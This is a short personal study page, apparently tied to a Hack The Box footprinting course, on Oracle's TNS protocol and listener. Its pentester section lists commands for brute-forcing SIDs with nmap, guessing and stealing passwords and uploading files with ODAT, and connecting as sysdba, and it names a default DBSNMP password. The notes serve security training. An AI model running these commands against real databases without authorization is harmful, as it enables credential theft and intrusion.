# TNS

[![footprinting](../../../cybersecurity/_badges/htb/footprinting.svg)](https://academy.hackthebox.com/course/preview/footprinting)

<div class="row row-cols-lg-2"><div>

Transparent Network Substrate (TNS) is a protocol owned and developed by Oracle. It's mainly used to manage [Oracle Databases](/programming-languages/databases/relational/dbms/oracle.md). 

It includes performance monitoring and analysis, error reporting, and logging tools. It supports a wide range of networking protocols such as IPX/SPX, TCP/IP, IPV6, and SSL/TLS. Communications are encrypted.

🐊️ **Port**: 1521 (TCP)

The server-side service that listens for clients is called a listener. Its configuration determines which networking protocols are allowed.
</div><div>
</div></div>

<hr class="sep-both">

## TNS Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

List databases using brute force:

```shell!
$ sudo nmap IP -p 1521 -sV --script oracle-sid-brute
```

[Oracle Database Attacking Tool](https://github.com/quentinhardy/odat) <small>(1.6k ⭐, ODAT, 2022 ☠️)</small> can be used to enumerate or exploit Oracle Databases.

```ps
$ sudo apt install odat
$ odat all -s IP
$ odat sidguesser -s IP
$ odat passwordguesser -s IP -d sid
$ odat passwordstealer -s IP -U username -P password -d sid --sysdba --get-passwords
$ odat utlfile [...] # file upload
```

📚 User may have sys dba access, try `--sysdba`.
</div><div>

We can use Oracle SQLPlus to connect to the database:

```shell!
$ sudo apt-get install oracle-instantclient-sqlplus
$ sudo updatedb
$ # if you got an error when running sqlplus
$ lpath=$(dirname `locate libsqlplus.so`) ; echo $lpath
$ sudo sh -c "echo $lpath > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
$ # connect
$ sqlplus username/password@IP/sid
$ sqlplus username/password@IP/sid as sysdba
```

📚 User may have sys dba access, try `as sysdba`.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `tnsnames.ora` (client-side infos, list of db/services configurations) 
* `listener.ora` (server-side config, listener config)
* `$ORACLE_HOME/network/admin` folder
* DBSNMP service has `dbsnmp` default password
* Finger service?
* PL/SQL Exclusion List (PlsqlExclusionList)
* Remove Listener Management?
</div><div>
</div></div>
